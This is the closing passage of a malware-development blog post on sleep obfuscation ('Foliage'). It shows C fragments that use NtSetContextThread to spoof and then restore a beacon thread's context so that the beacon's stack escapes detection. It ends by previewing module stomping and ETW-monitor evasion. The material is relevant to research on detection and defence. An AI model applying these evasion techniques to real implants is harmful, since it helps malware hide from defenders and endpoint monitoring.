	<span class="n">RopCtxSetSpf</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">MainThreadHandle</span><span class="p">;</span>
  <span class="n">RopCtxSetSpf</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">CtxSpf</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><p>And before completing the routine we will return the backup</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>  <span class="n">RopCtxSetBkp</span><span class="p">.</span><span class="n">Rip</span> <span class="o">=</span> <span class="n">Instance</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Win32</span><span class="p">().</span><span class="n">NtSetContextThread</span><span class="p">;</span>
  <span class="n">RopCtxSetBkp</span><span class="p">.</span><span class="n">Rcx</span> <span class="o">=</span> <span class="n">MainThreadHandle</span><span class="p">;</span>
	<span class="n">RopCtxSetBkp</span><span class="p">.</span><span class="n">Rdx</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">CtxBkp</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><p>This way, the main beacon stack during obfuscation will look like this</p><p></p><p>Escaping detections based on the beacon‚Äôs main thread stack.</p><h1 id="conclusion">Conclusion</h1><p>There are ways to improve our obfuscation with Sleep and we will mention one of them in our next blog post which is <strong><em>Module Stomping,</em></strong> using <strong><em>Jump Gadgets</em></strong> and avoiding detection based on <strong><em>ETW- IT</em></strong> as the <strong><em>Fluctuation Monitor</em></strong>.</p><p>However, there are ways to improve our Sleep Obfuscation to bypass these detection techniques. One such method I will cover in this blog is <code class="language-plaintext highlighter-rouge">Stack Duplication</code>.</p><p>Another interesting technique is <strong>Module Stomping</strong>, which will be the topic of the next article in this blog.</p><h1 id="reference-and-credits">Reference and credits</h1><ul><li><a href="https://dtsec.us/2023-04-24-Sleep/">https://dtsec.us/2023-04-24-Sleep/</a></li><li><a href="https://x.com/ilove2pwn_">https://x.com/ilove2pwn_</a></li><li><a href="https://maldevacademy.com/">https://maldevacademy.com/</a></li><li><a href="https://www.instagram.com/ichumbo/">Designer: Ian Melo (ichumbo)</a></li></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="https://oblivion-malware.xyz/categories/malware-development/">Malware Development</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 "><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Evading%20detection%20in%20memory%20-%20Pt%201:%20Sleep%20Obfuscation%20-%20Foliage%20-%20Oblivion&amp;url=%2Fposts%2Fsleep-obf-foliage%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Evading%20detection%20in%20memory%20-%20Pt%201:%20Sleep%20Obfuscation%20-%20Foliage%20-%20Oblivion&amp;u=%2Fposts%2Fsleep-obf-foliage%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fsleep-obf-foliage%2F&amp;text=Evading%20detection%20in%20memory%20-%20Pt%201:%20Sleep%20Obfuscation%20-%20Foliage%20-%20Oblivion" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="https://oblivion-malware.xyz/tags/windows/">Windows</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>
</body></html>